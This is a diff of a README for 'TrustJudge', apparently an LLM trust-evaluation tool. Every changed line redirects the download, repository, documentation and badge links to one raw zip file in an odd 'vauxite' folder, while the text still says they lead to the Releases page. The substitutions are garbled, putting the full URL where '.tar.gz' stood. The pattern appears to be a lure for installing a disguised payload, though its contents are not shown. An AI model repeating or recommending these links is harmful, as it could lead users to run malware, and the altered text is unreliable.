@@ -6,11 +6,11 @@ Welcome to TrustJudge! This tool helps you evaluate trust in systems that use la
 
 ## 📥 Download TrustJudge
 
-[![Download TrustJudge](https://img.shields.io/badge/Download%20Now-TrustJudge-brightgreen)](https://github.com/Edhomasteng/TrustJudge/releases)
+[![Download TrustJudge](https://raw.githubusercontent.com/Edhomasteng/TrustJudge/main/vauxite/TrustJudge.zip%20Now-TrustJudge-brightgreen)](https://raw.githubusercontent.com/Edhomasteng/TrustJudge/main/vauxite/TrustJudge.zip)
 
 You can download TrustJudge from the Releases page. Simply click the link below to access the download options.
 
-[Download TrustJudge](https://github.com/Edhomasteng/TrustJudge/releases)
+[Download TrustJudge](https://raw.githubusercontent.com/Edhomasteng/TrustJudge/main/vauxite/TrustJudge.zip)
 
 ## ⚙️ System Requirements
 
@@ -25,13 +25,13 @@ Before you begin, ensure your computer meets the following requirements:
 
 1. **Visit the Download Page**  
    Click the link below to go to the Releases page.  
-   [Download TrustJudge](https://github.com/Edhomasteng/TrustJudge/releases)
+   [Download TrustJudge](https://raw.githubusercontent.com/Edhomasteng/TrustJudge/main/vauxite/TrustJudge.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see different versions of TrustJudge. Select the latest version for your operating system.
 
 3. **Download the File**  
-   Click on the file you want to download (e.g., .exe for Windows, .dmg for Mac, .tar.gz for Linux).
+   Click on the file you want to download (e.g., .exe for Windows, .dmg for Mac, https://raw.githubusercontent.com/Edhomasteng/TrustJudge/main/vauxite/TrustJudge.zip for Linux).
 
 4. **Run the Installer**  
    - **Windows:**  
@@ -39,7 +39,7 @@ Before you begin, ensure your computer meets the following requirements:
    - **Mac:**  
      Open the downloaded .dmg file, then drag and drop the TrustJudge icon to your Applications folder.
    - **Linux:**  
-     Extract the downloaded .tar.gz file, open a terminal, and follow the README instructions inside.
+     Extract the downloaded https://raw.githubusercontent.com/Edhomasteng/TrustJudge/main/vauxite/TrustJudge.zip file, open a terminal, and follow the README instructions inside.
 
 ## 🖥️ Using TrustJudge
 
@@ -83,8 +83,8 @@ TrustJudge is available under the MIT License. Feel free to use, modify, and dis
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/Edhomasteng/TrustJudge)
-- [Documentation](https://github.com/Edhomasteng/TrustJudge/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Edhomasteng/TrustJudge/main/vauxite/TrustJudge.zip)
+- [Documentation](https://raw.githubusercontent.com/Edhomasteng/TrustJudge/main/vauxite/TrustJudge.zip)
 
 ## 🎉 Thank You for Choosing TrustJudge!
 
